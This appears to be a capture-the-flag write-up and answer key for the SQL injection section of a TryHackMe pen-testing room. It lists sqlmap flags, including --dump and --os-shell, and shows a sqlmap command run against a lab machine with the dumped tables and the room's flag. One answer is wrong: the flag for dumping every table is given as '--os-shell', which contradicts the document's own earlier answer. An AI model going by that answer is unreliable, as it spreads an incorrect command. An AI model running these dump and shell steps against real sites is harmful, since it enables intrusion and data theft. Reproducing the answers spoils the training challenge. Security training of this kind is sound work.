# TryHackMe [CC: Pen Testing](https://tryhackme.com/room/ccpentesting) SQL Injection
### References
* `sqlmap` Project. (2021, February 11). `sqlmapproject/sqlmap` Wiki > Usage. GitHub. https://github.com/sqlmapproject/sqlmap/wiki/Usage




## `sqlmap`
### How do you specify which url to check?
**Answer**: `-u`
### What about which google dork to use?
**Answer**: `-g`
### How do you select which parameter to use (example: in the url http://ex.com?test=1 the parameter would be `test`)?
**Answer**: `-p`
### What flag sets which database is in the target host's backend (example: If the flag is set to mysql then `sqlmap` will only test mysql injections)?
**Answer**: `--dbms`
### How do you select the level of depth `sqlmap` should use (higher = more accurate and more tests in general)?
**Answer**: `--level`
### How do you dump the table entries of the database?
**Answer**: `--dump`
### Which flag sets which database to enumerate?
**Answer**: `-d`
### Which flag sets which table to enumerate?
**Answer**: `-t`
### Which flag sets which column to enumerate?
**Answer**: `-c`
### How do you ask `sqlmap` to try to get an interactive os-shell?
**Answer**: `--os-shell`
### What flag dumps all data from every table
**Answer**: `--os-shell`
##  Vulnerable Web Application
### How many types of SQL injections is the site vulnerable to?
* `sqlmap --dump --forms -u <MACHINE_IP>` reveals 3 vulnerabilities:
  *  MySQL RLIKE boolean-based blind - `WHERE`, `HAVING`, `ORDER BY` or `GROUP BY` clause
  * Title: MySQL >= 5.6 `AND` error-based - `WHERE`, `HAVING`, `ORDER BY` or `GROUP BY` clause (GTID_SUBSET)
  * Title: MySQL >= 5.0.12 `AND` time-based blind (query `SLEEP`)

**Answer**: `3`
### What is the name of the database?

`sqlmap --dump --forms -u <MACHINE_IP>` reveals the database name:
* `lol` table output from `sqlmap`:
```
Database: tests
Table: lol
[1 entry]
+----------+
| flag     |
+----------+
| found_me |
+----------+
```
* `msg` table output from `sqlmap`:
```
Database: tests
Table: msg
[2 entries]
+------+
| msg  |
+------+
| msg  |
| test |
+------+
```
**Answer**: `tests`
### How many tables are in the database?
**Answer**: `2`
### What is the value of the flag?
**Answer**: `found_me`